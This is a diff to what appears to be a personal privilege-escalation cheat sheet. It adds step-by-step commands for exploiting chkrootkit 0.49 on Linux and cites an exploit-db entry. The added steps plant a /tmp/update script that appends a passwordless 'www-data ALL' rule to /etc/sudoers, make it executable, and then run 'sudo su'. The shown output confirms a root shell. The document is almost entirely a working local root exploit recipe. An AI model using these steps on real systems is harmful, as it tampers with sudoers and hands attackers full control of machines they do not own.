@@ -4,6 +4,9 @@ PrivilageEscalation
 
 Linux
 
+1.
+==========================================================================
+
 chkrootkit -V
 
 chkrootkit version 0.49
@@ -11,3 +14,16 @@ chkrootkit version 0.49
 EXPLOIT
 =======
 https://www.exploit-db.com/exploits/33899/
+
+STEPS
+1. echo 'echo "www-data ALL=NOPASSWD: ALL" >> /etc/sudoers && chmod 440 /etc/sudoers' > /tmp/update
+2. chmod 777 /tmp/update
+3. ls -alh /etc/sudoers
+4. sudo su 
+   |
+   |__id
+   uid=0(root) gid=0(root)
+
+==========================================================================
+
+
